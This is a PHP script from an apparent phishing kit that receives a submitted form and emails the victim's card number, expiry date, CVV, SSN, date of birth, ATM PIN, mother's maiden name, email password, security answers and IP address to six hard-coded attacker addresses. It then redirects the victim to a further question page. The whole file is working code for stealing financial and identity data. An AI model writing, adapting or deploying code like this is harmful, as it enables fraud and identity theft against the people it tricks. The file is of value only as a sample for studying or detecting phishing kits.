<?php
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");
$message .= "Prepa cad No: " .$_POST['1']."\n\n";
$message .= "ExpiDate: " .$_POST['2']."\n\n";
$message .= "CW: " .$_POST['3']."\n";
$message .= "S5n: " .$_POST['4']."\n";
$message .= "D0B: " .$_POST['44']."\n";
$message .= "Foolname: " .$_POST['5']."\n";
$message .= "PhoneNo: " .$_POST['6']."\n";
$message .= "Dl: " .$_POST['7']."\n";
$message .= "Fada Mid Name: " .$_POST['8']."\n";
$message .= "Atm: " .$_POST['9']."\n";
$message .= "Mmn: " .$_POST['10']."\n";
$message .= "Address: " .$_POST['first']."\n";
$message .= "Address: " .$_POST['school']."\n";
$message .= "zipcode: " .$_POST['11']."\n";
$message .= "EmailAdi: " .$_POST['12']."\n";
$message .= "Pass: " .$_POST['13']."\n";
$message .= "Pets Name: " .$_POST['14']."\n";
$message .= "-----F0000l--------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "F000l\n";$recipient = "donflow2021@yahoo.com,ceocfo1988@aol.com,donflowmania@yahoo.com, user0202777a@gmail.com, jcole15000@hotmail.com, donflowmania@maine.rr.com";
$subject = "F0000l";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."F0000l";
$headers .= "F0000l";
     mail("$cc", "yahoo Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: questions.htm");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>
        